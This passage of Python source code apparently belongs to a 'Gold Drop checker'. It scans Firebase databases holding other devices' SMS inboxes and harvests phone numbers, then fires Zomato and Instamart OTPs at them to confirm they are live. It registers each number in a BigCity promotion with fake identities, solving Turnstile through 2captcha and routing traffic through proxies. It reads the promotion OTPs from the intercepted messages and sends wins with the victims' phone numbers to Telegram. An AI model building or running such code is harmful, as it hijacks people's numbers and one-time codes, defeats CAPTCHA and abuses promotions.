        elapsed = time.time() - ZOMATO_LAST_CALL
        if elapsed < 3:
            time.sleep(3 - elapsed)
        ZOMATO_LAST_CALL = time.time()

    try:
        session = requests.Session()
        session.headers.update({
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        csrf = uuid.uuid4().hex
        lc = uuid.uuid4().hex
        payload = {
            "country_id": "1", "number": phone, "type": "initiate",
            "hash": "", "id_token": "", "fb_token": "", "email": "",
            "name": "", "otp": "", "csrf_token": csrf, "lc": lc,
            "verification_type": "sms", "message_uuid": "", "theme": "",
        }
        r = session.post(
            "https://accounts.zomato.com/login/phone",
            files={k: (None, str(v)) for k, v in payload.items()},
            headers={
                "x-zomato-csrft": "",
                "origin": "https://accounts.zomato.com",
                "referer": "https://accounts.zomato.com/zoauth/login?login_challenge=%s" % lc,
            },
            proxies=proxies,
            timeout=12,
        )
        result = r.json()
        if result.get("status"):
            return True
        log("  Zomato rejected %s: %s" % (phone, result.get("message", "Unknown")))
        return False
    except Exception as exc:
        log("Zomato OTP error for %s: %s" % (phone, exc), "ERROR")
        return False


def poll_for_zomato_otp(db_url, device_id, timeout=12, interval=3, last_key=None):
    if last_key is None:
        last_key = get_last_message_key(db_url, device_id)
    start = time.time()
    while time.time() - start < timeout:
        time.sleep(interval)
        try:
            for msg_key, msg in fetch_messages(db_url, device_id, 20).items():
                if msg_key <= last_key or not isinstance(msg, dict):
                    continue
                text = message_text(msg).lower()
                sender = message_sender(msg).lower()
                is_zomato = any(kw in text for kw in ("zomato", "eternal"))
                is_zomato = is_zomato or any(kw in sender for kw in ("zomato", "zm-", "eternal"))
                if is_zomato or ("verification" in text and "otp" in text):
                    return True
        except Exception:
            pass
    return False


# ─── Gold Drop Flow ─────────────────────────────────────────────────────────

def run_gold_flow(phone, db_url, device_id, poll_otp_fn, proxies=None, baseline_key=""):
    """One registration attempt. Returns (True, decoded_response) or (False, {'error': ...})."""
    s = None
    pincode = None
    try:
        s, user_key, data_key = gold_create_session(proxies)
        gold_get_start(s, user_key)
        name = random_name()
        email = random_email()
        pincode = next_pincode()
        log("  [%s] Registering: %s / %s / %s" % (phone, name, pincode, user_key))

        # One Turnstile token per registration attempt (single-use, fresh).
        token = solve_turnstile()
        gold_register(s, user_key, data_key, phone, name, email, pincode, token)
        log("  [%s] OTP sent. Waiting for BigCity SMS..." % phone)

        otp = poll_otp_fn(BIGCITY_SMS_PATTERN, BIGCITY_OTP_TIMEOUT,
                          BIGCITY_POLL_INTERVAL, baseline_key)
        if not otp:
            return False, {"error": "BigCity OTP not received in time"}
        log("  [%s] BigCity OTP: %s" % (phone, otp))

        decoded = gold_verify(s, user_key, data_key, otp)
        return True, {
            "decoded": decoded,
            "user_key": user_key,
            "otp": otp,
            "name": name,
            "email": email,
            "pincode": pincode,
        }
    except Exception as exc:
        return False, {"error": str(exc), "pincode": pincode}
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def report_win(decoded, phone, device_id, db_url, meta, baseline_key):
    """Save and alert with the ENTIRE decoded response. No reward field is assumed."""
    win_type = decoded.get("win_type")
    reward = decoded.get("reward")
    hit = {
        "campaign": "gold-drop",
        "phone": phone,
        "device_id": device_id,
        "firebase_url": db_url,
        "user_key": meta.get("user_key"),
        "name": meta.get("name"),
        "email": meta.get("email"),
        "pincode": meta.get("pincode"),
        "win_type": win_type,
        "reward": reward,
        "full_response": decoded,
        "timestamp": datetime.now(IST).isoformat(),
    }
    save_hit(hit)
    pretty = json.dumps(decoded, indent=2, ensure_ascii=False)
    alert = (
        "🏆 <b>GOLD DROP WIN!</b>\n"
        "📱 Phone: <code>%s</code>\n"
        "🎁 win_type: <code>%s</code>\n"
        "📟 Device: <code>%s</code>\n"
        "🔗 Firebase: <code>%s</code>\n"
        "📦 <b>FULL RESPONSE</b>:\n<pre>%s</pre>"
        % (phone, html.escape(str(win_type)), html.escape(device_id),
           html.escape(db_url), html.escape(pretty))
    )
    send_telegram_alert(alert)
    threading.Thread(
        target=watch_reward_sms,
        args=(db_url, device_id, baseline_key, hit),
        daemon=True,
    ).start()


# ─── Instamart fallback (only when Zomato rejects / errors) ────────────────

INSTAMART_SIGNIN_URL = "https://instamart.in/api/instamart/auth/signin-check"
INSTAMART_SEND_URL = "https://instamart.in/api/instamart/auth/send-otp"
INSTAMART_MATCHERS = {
    "signin": "cfa8f8egbg8gee88ggddef9",
    "send": "ed8ee8egbg8gee8dddgc98e",
}
INSTAMART_BUILD_VERSION = "2.393.0"
INSTAMART_UA = ("Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/157.0.0.0 Mobile Safari/537.36")
# Observed live sender: VM-SWIGGY-S, "This is a Swiggy login OTP... Your OTP 176024..."
INSTAMART_SENDER_KEYWORDS = ("INSTAMART", "SWIGGY-S", "IMART")
INSTAMART_TEXT_KEYWORDS = ("instamart", "swiggy login")
INSTAMART_LOCK = threading.Lock()
INSTAMART_LAST_CALL = 0


def instamart_send_otp(phone, proxies=None):
    """Two-call Instamart OTP flow, verified live against 9382771876."""
    global INSTAMART_LAST_CALL
    with INSTAMART_LOCK:
        elapsed = time.time() - INSTAMART_LAST_CALL
        if elapsed < 3:
            time.sleep(3 - elapsed)
        INSTAMART_LAST_CALL = time.time()

    device_id = str(uuid.uuid4())
    headers = {
        "content-type": "application/json",
        "x-build-version": INSTAMART_BUILD_VERSION,
        "x-device-id": device_id,
        "user-agent": INSTAMART_UA,
        "accept": "*/*",
        "origin": "https://instamart.in",
        "referer": "https://instamart.in/auth",
    }
    s = requests.Session()
    if proxies:
        s.proxies.update(proxies)
    try:
        for url, matcher in ((INSTAMART_SIGNIN_URL, INSTAMART_MATCHERS["signin"]),
                             (INSTAMART_SEND_URL, INSTAMART_MATCHERS["send"])):
            h = dict(headers)
            h["matcher"] = matcher
            r = s.post(url, json={"data": {"mobile": phone}}, headers=h, timeout=20)
            data = (r.json() or {}).get("data") or {}
            if r.status_code != 200 or data.get("statusCode") != 0:
                log("  Instamart %s failed: HTTP %s %s"
                    % (url.rsplit("/", 1)[-1], r.status_code, str(data)[:200]), "ERROR")
                return False
        return True
    except Exception as exc:
        log("Instamart OTP error for %s: %s" % (phone, exc), "ERROR")
        return False
    finally:
        s.close()


def is_instamart_message(msg):
    sender = message_sender(msg).upper()
    text = message_text(msg).lower()
    if any(kw in sender for kw in INSTAMART_SENDER_KEYWORDS):
        return True
    return any(kw in text for kw in INSTAMART_TEXT_KEYWORDS)


def poll_for_instamart_otp(db_url, device_id, timeout=20, interval=3, last_key=None):
    """Confirm the fallback OTP actually landed on the device."""
    if last_key is None:
        last_key = get_last_message_key(db_url, device_id)
    start = time.time()
    while time.time() - start < timeout:
        time.sleep(interval)
        try:
            for msg_key, msg in fetch_messages(db_url, device_id, 20).items():
                if msg_key <= last_key or not isinstance(msg, dict):
                    continue
                if is_instamart_message(msg) and re.search(r"\b\d{6}\b", message_text(msg)):
                    return True
        except Exception:
            pass
    return False


# ─── Main Worker ────────────────────────────────────────────────────────────

def firebase_worker(instance_id, start_idx, end_idx):
    RUNNING_FLAGS[instance_id] = True
    log("[*] Inst %s started: links %s-%s" % (instance_id, start_idx, end_idx))

    while RUNNING_FLAGS.get(instance_id, False):
        try:
            with TOKEN_LOCK:
                used_now, budget = TOKENS_USED, TOKEN_BUDGET
            log("[*] Inst %s token budget: %d/%d used (~$%.3f spent, ~$%.3f left)"
                % (instance_id, used_now, budget, used_now * 0.00145,
                   max(0, budget - used_now) * 0.00145))

            # Reload each cycle so a proxy saved in the dashboard takes effect.
            # A Railway env var overrides the file when one is configured.
            proxy = get_proxy()
            proxy_dict = {"http": proxy, "https": proxy} if proxy else None

            links = load_firebase_links()
            if not links:
                time.sleep(10)
                continue

            actual_end = min(end_idx, len(links) - 1)
            if start_idx > actual_end:
                time.sleep(10)
                continue

            for idx in range(start_idx, actual_end + 1):
                if not RUNNING_FLAGS.get(instance_id, False):
                    break

                db_url = links[idx].strip().rstrip("/")
                log("[*] Inst %s Scanning: %s" % (instance_id, db_url.split("//")[-1]))

                clients = fetch_clients(db_url)
                if not clients:
                    continue

                for device_id, device_data in clients.items():
                    if not RUNNING_FLAGS.get(instance_id, False):
                        break
                    if not device_data or not isinstance(device_data, dict):
                        continue
                    if not device_data.get("status"):
                        continue

                    # Device-level skips, evaluated with today's IST date at visit.
                    bigcity_today = bigcity_count_today(db_url, device_id)
                    if bigcity_today >= BIGCITY_DAILY_LIMIT:
                        log("  [%s] %d BigCity SMS dated today - skipping device"
                            % (device_id[:12], bigcity_today))
                        continue
                    if device_marked_today(device_id):
                        log("  [%s] Already used today (marker) - skipping device"
                            % device_id[:12])
                        continue

                    numbers = []
                    primary = extract_phone_from_device(device_data)
                    if primary:
                        numbers.append(primary)
                    for phone in extract_phones_from_messages(db_url, device_id):
                        if phone not in numbers:
                            numbers.append(phone)
                    if not numbers:
                        continue

                    for phone in numbers:
                        if not RUNNING_FLAGS.get(instance_id, False):
                            break
                        if phone in USED_NUMBERS:
                            log("    [~] Already used today (cache), skipping: %s" % phone)
                            continue
                        with CLAIMED_LOCK:
                            if phone in CLAIMED_NUMBERS:
                                log("    [~] Claimed by another instance, skipping: %s" % phone)
                                continue
                            CLAIMED_NUMBERS.add(phone)

                        # Capture the inbox watermark before triggering Zomato.
                        zomato_baseline = get_last_message_key(db_url, device_id)
                        log("[*] Inst %s Checking: %s | Device: %s"
                            % (instance_id, phone, device_id[:12]))

                        if not zomato_send_otp(phone, proxies=proxy_dict):
                            # Fallback only when Zomato rejected the number or errored.
                            # A missing Zomato OTP after a successful send is NOT a fallback case.
                            log("    [-] Zomato rejected/errored; trying Instamart fallback")
                            if not instamart_send_otp(phone, proxies=proxy_dict):
                                log("    [-] Instamart fallback also failed")
                                release_claim(phone)
                                continue
                            if not poll_for_instamart_otp(db_url, device_id,
                                                          last_key=zomato_baseline):
                                log("    [-] Instamart OTP not received on device")
                                release_claim(phone)
                                continue
                        elif not poll_for_zomato_otp(db_url, device_id,
                                                     last_key=zomato_baseline):
                            log("    [-] Zomato OTP not received on device; skipping")
                            release_claim(phone)
                            continue

                        log("    [+] Active number confirmed. Starting Gold Drop flow.")

                        def poll_bigcity(pattern, timeout, interval, l_key,
                                         _fb=db_url, _dev=device_id):
                            return poll_firebase_for_otp(_fb, _dev, pattern,
                                                         timeout, interval, last_key=l_key)

                        # 5 attempts per number, fresh session and fresh OTP each time.
                        for attempt in range(1, ATTEMPTS_PER_NUMBER + 1):
                            if not RUNNING_FLAGS.get(instance_id, False):
                                break
                            # Baselines are taken per attempt so an OTP from a previous
                            # attempt is never mistaken for the current one.
                            baseline = get_last_message_key(db_url, device_id)
                            log("    [*] Attempt %d/%d for %s" % (attempt, ATTEMPTS_PER_NUMBER, phone))

                            ok, result = run_gold_flow(
                                phone, db_url, device_id, poll_bigcity,
                                proxies=proxy_dict, baseline_key=baseline,
                            )

                            if ok:
                                decoded = result["decoded"]
                                if classify_win(decoded):
                                    log("    [%s] WIN win_type=%s" % (phone, decoded.get("win_type")), "WIN")
                                    report_win(decoded, phone, device_id, db_url, result, baseline)
                                    break  # no further attempts needed after a win
                                else:
                                    log("    [%s] No reward (win_type=%s)"
                                        % (phone, decoded.get("win_type")), "NOREWARD")
                            else:
                                error = result.get("error", "Unknown error")
                                error_lower = error.lower()
                                # Stop this number immediately, at whichever attempt
                                # the participation response appears; no TG alert.
                                already = is_used_today_error(error)
                                pincode_error = is_pincode_error(error)
                                if pincode_error:
                                    bad_pin = result.get("pincode")
                                    reject_pincode(bad_pin)
                                    log("    [!] Pincode %s rejected by server; removed from pool"
                                        % bad_pin, "ERROR")
                                token_error = is_token_error(error)
                                routine = (
                                    pincode_error
                                    or token_error
                                    or is_connection_error(error)
                                    or any(kw in error_lower for kw in (
                                        "otp not received in time",
                                        "otp verification failed",
                                        "read timed out",
                                        "timed out",
                                        "connection pool",
                                        "connectionerror",
                                    ))
                                )
                                if already:
                                    with USED_NUMBERS_LOCK:
                                        USED_NUMBERS.add(phone)
                                    mark_device_used_today(device_id)
                                    log("    [~] Number already used today, skipping: %s | device marked for today" % phone)
                                    break  # stop attempts for this number only; other numbers continue
                                if token_error:
                                    # Never burn the remaining tokens on a rejected token.
                                    log("    [~] Turnstile token rejected; stopping this number", "ERROR")
                                    break
                                if routine:
                                    log("    [!] %s" % error, "ERROR")
                                else:
                                    log("    [!] %s" % error, "ERROR")
                                    send_telegram_alert(
                                        "⚠️ <b>GOLD DROP ERROR</b>\n"
                                        "📱 Phone: <code>%s</code>\n"
                                        "❌ %s\n"
                                        "📟 Device: <code>%s</code>"
                                        % (phone, html.escape(error), html.escape(device_id))
                                    )

                        release_claim(phone)

            log("[+] Inst %s cycle complete. Restarting in 10s..." % instance_id)
            time.sleep(10)
        except Exception as exc:
            log("[!] Inst %s Error: %s" % (instance_id, exc), "ERROR")
            time.sleep(10)

    log("[-] Inst %s stopped." % instance_id)
    ACTIVE_THREADS.pop(instance_id, None)


# ─── Dry Run ────────────────────────────────────────────────────────────────

def test_token_flow(phone="8000958285"):
    """One real solve + one register against an already-used number (no SMS)."""
    proxy = get_proxy()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    s, user_key, data_key = gold_create_session(proxies)
    gold_get_start(s, user_key)
    token = solve_turnstile()
    log("Testing register with token for %s" % phone)
    try:
        result = gold_register(s, user_key, data_key, phone,
                               random_name(), random_email(), next_pincode(), token)
        log("REGISTER RESULT: %s" % json.dumps(result, ensure_ascii=False))
    except Exception as exc:
        text = str(exc)
        if is_token_error(text):
            log("TOKEN REJECTED: %s" % text, "ERROR")
        elif is_used_today_error(text):
            log("TOKEN ACCEPTED (server reached participation check): %s" % text, "HIT")
        else:
            log("REGISTER ERROR: %s" % text, "ERROR")
    finally:
        s.close()


def dry_run():
    log("=== DRY RUN (no live site requests) ===")
    log("2captcha key: %s | budget: %d tokens" % ("set" if TWOCAPTCHA_KEY else "NOT SET", TOKEN_BUDGET))
    links = load_firebase_links()
    assert links and len(links) > 0, "link.txt parsed to zero databases"
    log("link.txt: %d databases (first: %s)" % (len(links), links[0]))

    seen = []
    for _ in range(len(PINCODES) + 7):
        seen.append(next_pincode())
    assert len(set(seen[:len(PINCODES)])) == len(PINCODES), "pincode pool has duplicates"
    assert all(500001 <= int(p) <= 509412 for p in seen), "pincode outside 500001-509412"
    assert seen[0] != seen[1], "pincode rotation did not advance"
    log("Pincodes: %d unique, rotation OK, range 500001-509412" % len(PINCODES))

    pincode_error = ("Registration failed: {'statusCode': 400, 'message': "
                     "'This offer is valid only in Telangana and Andhra Pradesh', "
                     "'messageId': 'pincode'}")
    assert is_pincode_error(pincode_error), "pincode rejection not detected"
    assert not is_pincode_error("BigCity OTP not received in time")
    old_rejected = set(REJECTED_PINCODES)
    try:
        bad = PINCODES[0]
        reject_pincode(bad)
        drawn = [next_pincode() for _ in range(len(PINCODES))]
        assert str(bad) not in drawn, "rejected pincode still drawn from pool"
    finally:
        with PINCODE_LOCK:
            REJECTED_PINCODES.clear()
            REJECTED_PINCODES.update(old_rejected)
    log("Pincode rejection: detected, removed from pool, and not redrawn")

    dk = "Fh10onmVEwyPjsDMpdEOxQ0"
    _, data_field = gold_sign({"otp": "972357", "userKey": "1854843220"}, dk)
    assert gold_verify_signature(data_field, dk), "signature self-check failed"
    assert gold_verify_signature(
        "MTc5NDgyMTg3Njk0MQ==.eyJvdHAiOiI5NzIzNTciLCJ1c2VyS2V5IjoiMTg1NDg0MzIyMCIsInQiOiIxNzk0ODIxODc2OTQxIn0="
        ".51Ma2dODzBlOGY4Y2UwZTk3YmFlYTdkYzQzMGMyM2ZhZTNlMDJjZDhmMzk3ZDYwZjM4MmQwMjYxNTU0NTU1MDY2NTdlNQ==",
        dk,
    ), "captured verify-otp signature did not reproduce"
    log("Signature: generated + captured verify-otp fields verify byte-exact")

    used_error = ("Registration failed: {'statusCode': 400, 'message': "
                  "'Please try again tomorrow using the same number', "
                  "'messageId': 'participation'}")
    assert is_used_today_error(used_error), "participation error not classified as used-today"
    assert not is_used_today_error("BigCity OTP not received in time")
    log("Used-today detection: participation error matched, routine OTP error not matched")

    # Device day-marker: date key, today-only skip, midnight rollover.
    assert re.match(r"^\d{4}-\d{2}-\d{2}$", today_key()), "today_key format wrong"
    import tempfile
    old_marks = DEVICE_MARKS_FILE
    tmp_dir = tempfile.mkdtemp(prefix="gd-marks-")
    try:
        globals()["DEVICE_MARKS_FILE"] = os.path.join(tmp_dir, "device_day_marks.json")
        assert not device_marked_today("dry-device"), "fresh device should not be marked"
        mark_device_used_today("dry-device")
        assert device_marked_today("dry-device"), "device not marked after participation"
        data = load_device_marks()
        assert today_key() in data and "dry-device" in data[today_key()]
        # simulate next calendar date: marker for today must not apply tomorrow
        tomorrow = (datetime.now(IST) + timedelta(days=1)).strftime("%Y-%m-%d")
        assert "dry-device" not in data.get(tomorrow, []), "marker leaked into tomorrow"
    finally:
        globals()["DEVICE_MARKS_FILE"] = old_marks
        try:
            import shutil
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass
    log("Device marker: today-only, rollover to next date verified")

    # BigCity daily count uses only messages dated today.
    today = datetime.now(IST).strftime("%d-%m-%Y")
    old_fetch = globals()["fetch_messages"]
    try:
        globals()["fetch_messages"] = lambda *a, **k: {
            "1": {"sender": "VK-BGCITY-T", "dateTime": "%s | 01:00 am" % today, "message": "OTP 123456 Team BigCity"},
            "2": {"sender": "VK-BGCITY-T", "dateTime": "01-01-2020 | 01:00 am", "message": "OTP 654321 Team BigCity"},
        }
        assert bigcity_count_today("db", "dev") == 1, "old BigCity SMS counted toward today"
    finally:
        globals()["fetch_messages"] = old_fetch
    log("BigCity daily count: only today's messages counted")

    # Claim / used-number cache helpers.
    old_claimed = set(CLAIMED_NUMBERS)
    old_used = set(USED_NUMBERS)
    try:
        with CLAIMED_LOCK:
            CLAIMED_NUMBERS.clear()
        with USED_NUMBERS_LOCK:
            USED_NUMBERS.clear()
        with CLAIMED_LOCK:
            CLAIMED_NUMBERS.add("dry-phone")
        release_claim("dry-phone")
        assert "dry-phone" not in CLAIMED_NUMBERS, "claim not released"
    finally:
        with CLAIMED_LOCK:
            CLAIMED_NUMBERS.clear()
            CLAIMED_NUMBERS.update(old_claimed)
        with USED_NUMBERS_LOCK:
            USED_NUMBERS.clear()
            USED_NUMBERS.update(old_used)
    log("Claim/used caches: claim release verified")

    proxy_error = ("HTTPSConnectionPool(host='golddropgolddhamaka.com', port=443): "
                   "Max retries exceeded with url: /api/users (Caused by ProxyError("
                   "'Unable to connect to proxy', OSError('Tunnel connection failed: "
                   "504 Gateway Time-out')))")
    assert is_connection_error(proxy_error), "proxy error not classified as routine"
    assert not is_connection_error("Registration failed: {'messageId': 'participation'}")
    log("Proxy/network errors: classified as routine, no Telegram alert")

    assert is_instamart_message({
        "sender": "VM-SWIGGY-S",
        "message": "This is a Swiggy login OTP. Do not share the OTP. Your OTP 176024 to log into Swiggy account.",
    })
    assert is_instamart_message({"sender": "VK-INSTAMART-T", "message": "Your OTP is 123456"})
    assert not is_instamart_message({"sender": "VK-BGCITY-T", "message": "Your OTP to register is 123456. Team BigCity"})
    log("Instamart fallback: sender/text matching configured")

    assert len(TINY_JPEG) == 285 and TINY_JPEG[:2] == b"\xff\xd8" and TINY_JPEG[-2:] == b"\xff\xd9"
    log("TINY_JPEG: %d bytes, valid JPEG framing" % len(TINY_JPEG))

    proxy = get_proxy()
    assert proxy and "://" in proxy, "no usable proxy in env or settings.json"
    log("Proxy: configured (%s...)" % proxy.split("@")[-1])
    log("Data dir: %s" % DATA_DIR)

    # Date gate behaviour at midnight, without touching Firebase.
    log("=== DRY RUN PASSED ===")


# ─── Flask Routes ───────────────────────────────────────────────────────────

@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "campaign": "gold-drop",
        "links": len(load_firebase_links()),
        "instances": len(load_instances()),
        "running": sorted(str(k) for k, v in RUNNING_FLAGS.items() if v),
    })


@app.route("/")
def dashboard():
    instances = load_instances()
    for inst in instances:
        inst["status"] = "Running" if RUNNING_FLAGS.get(str(inst["id"]), False) else "Stopped"
    return render_template(
        "dashboard.html",
        instances=instances,
        log_count=len(logs),
        hit_count=len(hits),
        link_count=len(load_firebase_links()),
    )


@app.route("/logs")
def logs_page():
    with logs_lock:
        return render_template("logs.html", logs=list(reversed(logs)))


@app.route("/hits")
def hits_page():
    with hits_lock:
        return render_template("hits.html", hits=list(reversed(hits)))


@app.route("/firebases")
def firebases_page():
    links = load_firebase_links()
    return render_template("firebases.html", links=list(enumerate(links)))


@app.route("/settings")
def settings_page():
    return render_template("settings.html", settings=load_settings())


@app.route("/api/instances", methods=["POST"])
def manage_instances():
    action = request.form.get("action")
    instances = load_instances()

    if action == "add":
        new_id = str(max([int(i.get("id", 0)) for i in instances], default=0) + 1)
        start_idx = request.form.get("start_idx", 0, type=int)
        end_idx = request.form.get("end_idx", 0, type=int)
        instances.append({"id": new_id, "start_idx": start_idx, "end_idx": end_idx})
        save_instances(instances)

    elif action == "start":
        inst_id = request.form.get("id")
        for inst in instances:
            if str(inst.get("id")) == str(inst_id):
                if not RUNNING_FLAGS.get(inst_id, False):
                    t = threading.Thread(
                        target=firebase_worker,
                        args=(inst_id, inst["start_idx"], inst["end_idx"]),
                    )
                    t.daemon = True
                    ACTIVE_THREADS[inst_id] = t
                    t.start()
                break

    elif action == "stop":
        RUNNING_FLAGS[request.form.get("id")] = False

    elif action == "delete":
        inst_id = request.form.get("id")
        RUNNING_FLAGS[inst_id] = False
        save_instances([i for i in instances if str(i.get("id")) != str(inst_id)])

    elif action == "auto_divide":
        for k in list(RUNNING_FLAGS.keys()):
            RUNNING_FLAGS[k] = False
        time.sleep(1)
        count = len(load_firebase_links())
        n = request.form.get("num_instances", 1, type=int)
        if n > 0 and count > 0:
            new_instances = []
            chunk, rem = divmod(count, n)
            curr = 0
            for i in range(n):
                extra = 1 if i < rem else 0
                end = curr + chunk + extra - 1
                new_instances.append({"id": str(i + 1), "start_idx": curr, "end_idx": end})
                curr = end + 1
            save_instances(new_instances)

    return redirect(url_for("dashboard"))


@app.route("/api/toggle", methods=["POST"])
def toggle_instances():
    action = request.form.get("action")
    instances = load_instances()
    if action == "start_all":
        for inst in instances:
            inst_id = str(inst.get("id"))
            if not RUNNING_FLAGS.get(inst_id, False):
                t = threading.Thread(
                    target=firebase_worker,
                    args=(inst_id, inst["start_idx"], inst["end_idx"]),
                )
                t.daemon = True
                ACTIVE_THREADS[inst_id] = t
                t.start()
    elif action == "stop_all":
        for k in list(RUNNING_FLAGS.keys()):
            RUNNING_FLAGS[k] = False
    return redirect(url_for("dashboard"))


@app.route("/api/logs")
def api_logs():
    with logs_lock:
        return jsonify(list(logs))


@app.route("/api/settings", methods=["POST"])
def api_save_settings():
    data = request.json or {}
    settings = load_settings()
    settings.update(data)
    save_settings(settings)
    return jsonify({"status": "saved"})


@app.route("/api/test_proxy", methods=["POST"])
def api_test_proxy():
    proxy_url = (request.json or {}).get("proxy", "")
    if not proxy_url:
        return jsonify({"status": "error", "message": "No proxy provided"})
    proxy_dict = {"http": proxy_url, "https": proxy_url}
    try:
        r = requests.get("http://ip-api.com/json/", proxies=proxy_dict, timeout=10)
        data = r.json()
        if data.get("status") == "success":
            return jsonify({"status": "success", "ip": data.get("query"),
                            "country": data.get("country")})
        return jsonify({"status": "error", "message": "Invalid response from ip-api"})
    except Exception as exc:
        return jsonify({"status": "error", "message": str(exc)})


@app.route("/api/update-links", methods=["POST"])
def api_update_links():
    links = (request.json or {}).get("links", "")
    with open(LINKS_FILE, "w", encoding="utf-8") as handle:
        handle.write(links)
    return jsonify({"status": "saved"})


def auto_bootstrap():
    """On first boot, divide the link list into shards and save them."""
    links = load_firebase_links()
    if not links or load_instances():
        return False
    n = max(1, int(os.environ.get("NUM_INSTANCES", "10")))
    n = min(n, len(links))
    chunk, rem = divmod(len(links), n)
    new_instances = []
    curr = 0
    for i in range(n):
        extra = 1 if i < rem else 0
        end = curr + chunk + extra - 1
        new_instances.append({"id": str(i + 1), "start_idx": curr, "end_idx": end})
        curr = end + 1
    save_instances(new_instances)
    log("Auto-created %d instances over %d databases" % (n, len(links)))
    return True


def start_all_instances():
    for inst in load_instances():
        inst_id = str(inst.get("id"))
        if RUNNING_FLAGS.get(inst_id, False):
            continue
        RUNNING_FLAGS[inst_id] = True
        t = threading.Thread(
            target=firebase_worker,
            args=(inst_id, inst["start_idx"], inst["end_idx"]),
            daemon=True,
        )
        ACTIVE_THREADS[inst_id] = t
        t.start()


def bootstrap_watcher():
    """Wait for link.txt to be added through the dashboard, then bootstrap once."""
    while True:
        try:
            if auto_bootstrap():
                start_all_instances()
                log("Workers auto-started after links became available")
                return
        except Exception as exc:
            log("Bootstrap watcher error: %s" % exc, "ERROR")
        time.sleep(10)


def request_shutdown(signum=None, frame=None):
    log("Shutdown signal received; stopping workers")
    for key in list(RUNNING_FLAGS.keys()):
        RUNNING_FLAGS[key] = False


if __name__ == "__main__":
    os.makedirs("templates", exist_ok=True)
    if "--dry-run" in sys.argv:
        dry_run()
    elif "--test-token" in sys.argv:
        phone = "8000958285"
        for arg in sys.argv:
            if arg.startswith("--phone="):
                phone = arg.split("=", 1)[1]
        test_token_flow(phone)
    else:
        port = int(os.environ.get("PORT", "5003"))
        log("Gold Drop checker starting on port %d" % port)
        log("Data dir: %s | Proxy: %s" % (DATA_DIR, "set" if get_proxy() else "not set"))
        try:
            signal.signal(signal.SIGTERM, request_shutdown)
            signal.signal(signal.SIGINT, request_shutdown)
        except ValueError:
            pass  # not on the main thread

        if os.environ.get("AUTOSTART", "1").strip().lower() not in ("0", "false", "no"):
            if not auto_bootstrap():
                threading.Thread(target=bootstrap_watcher, daemon=True).start()
            start_all_instances()

        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
